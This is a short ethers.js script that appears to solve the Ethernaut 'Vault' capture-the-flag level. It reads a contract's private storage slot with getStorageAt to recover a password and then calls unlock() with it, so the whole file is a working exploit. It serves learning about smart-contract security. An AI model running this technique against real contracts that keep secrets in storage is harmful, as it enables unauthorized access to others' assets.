const vaultJson = require("../artifacts/contracts/8_Vault.sol/Vault.json");

const VAULT_ADDRESS = "0x70872b850a9585B7EF031d7626406DD70F069BE4";

async function main() {
  const [signer] = await ethers.getSigners();

  console.log("Executing with account:", signer.address);

  const weiAmount = (await signer.getBalance()).toString();
  
  console.log("Account balance:", (await ethers.utils.formatEther(weiAmount)));

  const contract = new ethers.Contract(VAULT_ADDRESS, vaultJson.abi, signer);

  console.log('locked?', await contract.locked());

  console.log(await contract.deployTransaction)

  const password = await ethers.provider.getStorageAt(VAULT_ADDRESS, 1);

  const receipt = await contract.unlock(password);

  await receipt.wait();

  console.log('locked?', await contract.locked());

  console.log('done!')
}

main();